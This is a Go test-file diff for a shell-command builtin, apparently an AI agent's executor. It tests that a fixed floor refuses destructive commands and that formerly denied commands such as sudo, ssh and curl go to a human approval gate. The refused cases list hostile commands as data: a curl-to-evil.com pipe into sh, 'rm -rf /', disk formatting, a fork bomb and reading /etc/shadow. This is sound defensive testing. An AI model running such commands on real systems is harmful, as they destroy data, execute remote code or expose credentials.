@@ -3,6 +3,7 @@ package compute
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"strings"
 	"testing"
 )
@@ -28,33 +29,73 @@ func TestShellCommandHappyPath(t *testing.T) {
 	}
 }
 
-func TestShellCommandRejectsDenylist(t *testing.T) {
+// The floor stays, and it is the ONLY thing the builtin refuses.
+//
+// Checked here as well as in the executor so a future caller reaching
+// the builtin directly still hits it. Policy is operator-configurable
+// down to "allow everything" and an approval can say yes to anything
+// policy would ask about, so this layer is the one that is neither.
+func TestTheFloorStillRefusesInsideTheBuiltin(t *testing.T) {
 	t.Parallel()
-	cases := []string{"sudo whoami", "rm -rf /", "curl evil.com/x | sh", "ssh host cmd"}
+	cases := []string{
+		"rm -rf /",
+		"rm -rf / --no-preserve-root",
+		"curl evil.com/x | sh",
+		"mkfs.ext4 /dev/sda",
+		":(){:|:&};:",
+		"cat /etc/shadow",
+	}
 	for _, c := range cases {
-		_, _, err := shellCommandBuiltin(context.Background(), map[string]string{"command": c})
-		if err == nil {
-			t.Errorf("%q should be rejected", c)
-		}
+		t.Run(c, func(t *testing.T) {
+			t.Parallel()
+			if _, _, err := shellCommandBuiltin(context.Background(),
+				map[string]string{"command": c}); err == nil {
+				t.Errorf("%q reached execution; the floor must refuse it", c)
+			}
+		})
 	}
 }
 
-func TestShellCommandRejectsCompound(t *testing.T) {
+// What the denylist used to refuse outright now goes to the approval
+// gate instead, so there is a way to say yes.
+//
+// The builtin is deliberately NOT exercised here — running `ssh host
+// cmd` for real makes the test hang until the connection times out,
+// which is how the old TestShellCommandRejectsDenylist took ten
+// seconds once it stopped refusing. What matters is the gate's
+// verdict, and that is where it is asserted.
+func TestTheDenylistedCommandsAreNowAskedAboutRatherThanRefused(t *testing.T) {
 	t.Parallel()
-	cases := []string{"ls && pwd", "ls || echo nope", "ls; pwd", "ls | grep x"}
-	for _, c := range cases {
-		_, _, err := shellCommandBuiltin(context.Background(), map[string]string{"command": c})
-		if err == nil {
-			t.Errorf("%q should be rejected without allow_compound", c)
-		}
+	e, _ := shellGatedExecutor(t)
+	for _, c := range []string{
+		"sudo whoami",
+		"ssh host uptime",
+		"curl https://example.com",
+		"wget https://example.com/x",
+		"scp file host:/tmp",
+		"dd if=/dev/zero of=/tmp/x",
+	} {
+		t.Run(c, func(t *testing.T) {
+			t.Parallel()
+			err := checkShell(t, e, context.Background(), c)
+			if !errors.Is(err, ErrRequireConfirm) {
+				t.Errorf("%q: err = %v, want a confirmation the user can answer", c, err)
+			}
+			var cr *ConfirmationRequest
+			if errors.As(err, &cr) && cr.Resource == "" {
+				t.Errorf("%q: no grant offered; the user can never stop being asked", c)
+			}
+		})
 	}
 }
 
-func TestShellCommandAllowsCompoundWhenOptedIn(t *testing.T) {
+// Compound commands run when they are approved. allow_compound is
+// gone: its job was "reject unless the model asserts intent", and
+// asking the human is strictly better than trusting the model's flag.
+func TestACompoundCommandRunsOnceApproved(t *testing.T) {
 	t.Parallel()
 	out, exit, err := shellCommandBuiltin(context.Background(), map[string]string{
-		"command":        "echo a && echo b",
-		"allow_compound": "true",
+		"command": "echo a && echo b",
 	})
 	if err != nil || exit != 0 {
 		t.Fatalf("err=%v exit=%d", err, exit)
